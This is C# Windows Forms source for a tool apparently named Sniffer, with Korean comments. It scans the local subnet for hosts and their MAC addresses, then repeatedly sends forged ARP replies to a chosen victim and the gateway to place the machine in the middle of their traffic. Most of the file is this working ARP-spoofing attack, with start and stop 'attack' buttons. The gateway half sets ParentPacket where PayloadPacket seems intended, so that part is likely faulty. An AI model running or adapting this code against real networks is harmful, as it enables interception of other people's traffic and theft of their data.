using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using System.Diagnostics;
using System.Threading;
using SharpPcap;
using PacketDotNet;
namespace Sniffer
{
    public partial class AttackList : Form
    {
     
        static Thread t_startArpSpoofing;           //공격할 대상을 스푸핑한다.
        static Thread t_startArpScanning;           //공격할 대상을 스캐닝한다
        static bool threadState=false;
       

        public AttackList()
        {
            InitializeComponent();
            setDataGridView();
        }
     
        

        private void checkThreadState()
        {
            if (threadState == true)
            {
                btn_startArpSpoof.Text = "공격 종료";
            }
            else if (threadState == false)
            {
                btn_startArpSpoof.Text = "공격 시작";
            }
            // DataGridView의 컬럼 갯수를 3개로 설정합니다.
        }

        private void setDataGridView()      // DataGridView에 컬럼을 추가합니다.
        {
            dataGridView.ColumnCount = 3;
            dataGridView.Columns[0].Name = "Computer Name";
            dataGridView.Columns[1].Name = "IP";
            dataGridView.Columns[2].Name = "Mac";  
        }


        private void SearchAllNetwork()
        {
            if (NetworkInterface.GetIsNetworkAvailable())
            {
                IPInterfaceProperties ipProps;
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (((nic.OperationalStatus == OperationalStatus.Up) && (nic.NetworkInterfaceType != NetworkInterfaceType.Tunnel)) && (nic.NetworkInterfaceType != NetworkInterfaceType.Loopback))
                    {
                        ipProps = nic.GetIPProperties();

                        byte[] addr;
                        string ip;

                        foreach (GatewayIPAddressInformation gip in ipProps.GatewayAddresses)
                        {
                            addr = gip.Address.GetAddressBytes();

                            for (int i = byte.MinValue; i <= byte.MaxValue; i++)
                            {
                                addr.SetValue((byte)i, 3);
                                ip = string.Format("{0}.{1}.{2}.{3}", addr[0], addr[1], addr[2], addr[3]);
                                string macAddress = string.Empty;
                                System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
                                pProcess.StartInfo.FileName = "arp";
                                pProcess.StartInfo.Arguments = "-a " + ip;
                                pProcess.StartInfo.UseShellExecute = false;
                                pProcess.StartInfo.RedirectStandardOutput = true;
                                pProcess.StartInfo.CreateNoWindow = true;
                                pProcess.Start();
                                string strOutput = pProcess.StandardOutput.ReadToEnd();
                                string[] substrings = strOutput.Split('-');
                                if (substrings.Length >= 8)
                                {
                                    macAddress = substrings[3].Substring(Math.Max(0, substrings[3].Length - 2))
                                             + "-" + substrings[4] + "-" + substrings[5] + "-" + substrings[6]
                                             + "-" + substrings[7] + "-"
                                             + substrings[8].Substring(0, 2);

                                    try
                                    {
                                        if (dataGridView.InvokeRequired)
                                            dataGridView.Invoke(new MethodInvoker(delegate
                                            {
                                                //System.Net.IPHostEntry gethostname = System.Net.Dns.GetHostByAddress(ip);
                                                dataGridView.Rows.Add("hostname", ip, macAddress);

                                            }));
                                        else
                                            dataGridView.Rows.Add("hostname", ip, macAddress);
                                        
                                    }
                                    catch (Exception)
                                    {
                                        
                                    }                       
                                }
                                else
                                {
                                    //아이피에 해당하는 맥 Address가 없을 경우 여기로 옴
                                }                    
                            }
                        }
                    }
                }
            }


        }

        
        private void btn_select_Click(object sender, EventArgs e)
        {
            BaseInformation.targetIpAddress = this.dataGridView.Rows[this.dataGridView.CurrentCellAddress.Y].Cells[1].Value.ToString(); 
            BaseInformation.targetMacAddress = this.dataGridView.Rows[this.dataGridView.CurrentCellAddress.Y].Cells[2].Value.ToString();
            if (threadState == false)
            {
                threadState = true;
                t_startArpSpoofing = new Thread(() => startArpSpoofing());
                t_startArpSpoofing.Start();
                btn_startArpSpoof.Text = "공격 종료";
            }
            else
            {
                //t_startArpSpoofing = new Thread(() => startArpSpoofing(AttackIpList, AttackMacList));
                t_startArpSpoofing.Suspend();
                btn_startArpSpoof.Text = "공격 시작";
                threadState = false;
            }
            //
        }
        private void startArpSpoofing()
        {
            while (true)
            {
                // Millisecond 단위 이며 초기연결 지연설정
                int readTimeout = 1000;

                // 현재 단말기의 네트워크 장치의 리스트들을 불러온다.

                // 무선 랜카드의 인덱스 번호는 1번(단말기 설정에 따라 다름)
                ICaptureDevice device = BaseInformation.captureDevice;


                // 무선 랜카드를 프러미스큐어스 모드로 연다.
                device.Open(DeviceMode.Promiscuous, readTimeout);

                IPAddress targetIP = null;
                IPAddress gatewayIP = null;
                PhysicalAddress targetMac = null;
                PhysicalAddress srcMac = null;
                PhysicalAddress gatewayMac = null;
                targetIP = IPAddress.Parse(BaseInformation.targetIpAddress);
                targetMac = PhysicalAddress.Parse(BaseInformation.targetMacAddress.ToUpper());
                gatewayMac = PhysicalAddress.Parse(BaseInformation.gatewayMac.ToUpper());

                gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); //아이피에 게이트웨이 주소를 넣어주어야 한다.
                srcMac = PhysicalAddress.Parse(BaseInformation.myMacAddress.ToUpper());

                //타겟 Infection
                ARPPacket arp = new ARPPacket(ARPOperation.Response, targetMac, targetIP, srcMac, gatewayIP);
                EthernetPacket eth = new EthernetPacket(srcMac, targetMac, EthernetPacketType.Arp);
                eth.PayloadPacket = arp;
                device.SendPacket(eth);

                //게이트웨이 Infection
                ARPPacket arpForGateway = new ARPPacket(ARPOperation.Response, gatewayMac, gatewayIP, srcMac, targetIP);
                EthernetPacket ethforGateway = new EthernetPacket(srcMac, gatewayMac, EthernetPacketType.Arp);
                ethforGateway.ParentPacket = arpForGateway;
                device.SendPacket(ethforGateway);


                Thread.Sleep(100);
            }
        }

        private void btn_start_scan_Click(object sender, EventArgs e)
        {
            dataGridView.Rows.Clear();
            t_startArpScanning = new Thread(() => SearchAllNetwork());
            t_startArpScanning.Start();
        }

        private void AttackList_Load(object sender, EventArgs e)
        {
            checkThreadState();
        }

       
    }
}
